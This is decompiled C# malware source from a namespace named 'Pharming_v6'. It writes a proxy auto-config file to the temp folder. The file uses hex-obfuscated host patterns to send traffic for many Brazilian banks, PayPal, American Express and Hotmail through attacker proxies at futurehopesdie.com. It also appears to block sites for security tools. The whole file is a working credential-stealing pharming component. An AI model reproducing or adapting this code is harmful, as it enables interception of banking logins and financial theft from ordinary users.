using System.IO;
using Microsoft.VisualBasic.CompilerServices;

namespace Pharming_v6;

[StandardModule]
internal sealed class writepac
{
	public static void writepac()
	{
		string path = Module1.temp + "pacnet.jsp";
		string[] array = new string[137]
		{
			"function FindProxyForURL(url, host)", "{", "//IPS", "var ip = \"PROXY x.futurehopesdie.com\";", "var hot = \"PROXY y.futurehopesdie.com\";", "//Banco do Brasil", "var bb1 = \"*\\x62\\x62*\";", "var bb2 = \"*\\x62\\x61\\x6E\\x63\\x6F\\x64\\x6F\\x62\\x72\\x61\\x73\\x69\\x6C*\";", "if (shExpMatch(host, bb1)) {", "return ip;",
			"}", "if (shExpMatch(host, bb2)) {", "return ip;", "}", "// Banese", "var ban1 = \"*\\x62\\x61\\x6E\\x65\\x73\\x65*\";", "if (shExpMatch(host, ban1)) {", "return ip;", "}", "// Caixa Economica Federal",
			"var cef1 = \"*\\x63\\x65\\x66*\";", "var cef2 = \"*\\x63\\x61\\x69\\x78\\x61*\";", "if (shExpMatch(host, cef1)) {", "return ip;", "}", "if (shExpMatch(host, cef2)) {", "return ip;", "}", "//Bradesco", "var desco1 = \"*\\x62\\x72\\x61\\x64\\x65\\x73\\x63\\x6F*\";",
			"if (shExpMatch(host, desco1)) {", "return ip;", "}", "//HSBC", "var hsbc1 = \"*\\x68\\x73\\x62\\x63*\";", "if (shExpMatch(host, hsbc1)) {", "return ip;", "}", "//Hotmail", "var hot1 = \"*\\x68\\x6F\\x74\\x6D\\x61\\x69\\x6C*\";",
			"var hot2 = \"*\\x6C\\x69\\x76\\x65*\";", "if (shExpMatch(host, hot1)) {", "return hot;", "}", "if (shExpMatch(host, hot2)) {", "return hot;", "}", "//Santander", "var santa1 = \"*\\x73\\x61\\x6E\\x74\\x61\\x6E\\x64\\x65\\x72*\";", "var santa2 = \"*\\x72\\x65\\x61\\x6C*\";",
			"var santa3 = \"*\\x62\\x61\\x6E\\x65\\x73\\x70\\x61*\";", "if (shExpMatch(host, santa1)) {", "return ip;", "}", "if (shExpMatch(host, santa2)) {", "return ip;", "}", "if (shExpMatch(host, santa3)) {", "return ip;", "}",
			"//Sicredi", "var sic1 = \"*\\x73\\x69\\x63\\x72\\x65\\x64\\x69*\";", "if (shExpMatch(host, sic1)) {", "return ip;", "}", "//Itau", "var ita1 = \"*\\x69\\x74\\x61\\x75*\";", "if (shExpMatch(host, ita1)) {", "return ip;", "}",
			"//BNB", "var bnb1 = \"*\\x62\\x6E\\x62*\";", "if (shExpMatch(host, bnb1)) {", "return ip;", "}", "//Safra", "var saf1 = \"*\\x73\\x61\\x66\\x72\\x61*\";", "if (shExpMatch(host, saf1)) {", "return ip;", "}",
			"//Banrisul", "var banri1 = \"*\\x62\\x61\\x6E\\x72\\x69\\x73\\x75\\x6C*\";", "if (shExpMatch(host, banri1)) {", "return ip;", "}", "//Citibank", "var citi1 = \"*\\x63\\x69\\x74\\x69\\x62\\x61\\x6E\\x6B*\";", "if (shExpMatch(host, citi1)) {", "return ip;", "}",
			"//Cetelem", "var cete1 = \"*\\x63\\x65\\x74\\x65\\x6C\\x65\\x6D*\";", "if (shExpMatch(host, cete1)) {", "return ip;", "}", "//Pagseguro", "var pag1 = \"*\\x70\\x61\\x67\\x73\\x65\\x67\\x75\\x72\\x6F*\";", "if (shExpMatch(host, pag1)) {", "return ip;", "}",
			"//Intouch", "var int1 = \"*\\x69\\x6E\\x74\\x6F\\x75\\x63\\x68*\";", "if (shExpMatch(host, int1)) {", "return ip;", "}", "//Infoseg", "var info1 = \"*\\x69\\x6E\\x66\\x6F\\x73\\x65\\x67*\";", "if (shExpMatch(host, info1)) {", "return ip;", "}",
			"//Serasa", "var ser1 = \"*\\x73\\x65\\x72\\x61\\x73\\x61*\";", "if (shExpMatch(host, ser1)) {", "return ip;", "}", "//Amex", "var am1 = \"*\\x61\\x6D\\x65\\x72\\x69\\x63\\x61\\x6E*\";", "if (shExpMatch(host, am1)) {", "return ip;", "}",
			"//Paypal", "var pay1 = \"*\\x70\\x61\\x79\\x70\\x61\\x6C*\";", "if (shExpMatch(host, pay1)) {", "return ip;", "}", "//LinhaDefensiva", "var ld1 = \"*\\x6C\\x69\\x6E\\x68\\x61\\x64\\x65\\x66\\x65\\x6E\\x73\\x69\\x76\\x61*\";", "if (shExpMatch(host, ld1)) {", "return google.com.br;", "}",
			"//SecureSSL", "var ssl1 = \"*\\x73\\x65\\x63\\x75\\x72\\x65\\x73\\x73\\x6C*\";", "if (shExpMatch(host, ssl1)) {", "return google.com.br;", "}", "return \"DIRECT\";", "}"
		};
		StreamWriter streamWriter = new StreamWriter(path);
		int num = 0;
		do
		{
			streamWriter.WriteLine(array[num]);
			num = checked(num + 1);
		}
		while (num <= 136);
		streamWriter.Close();
	}
}
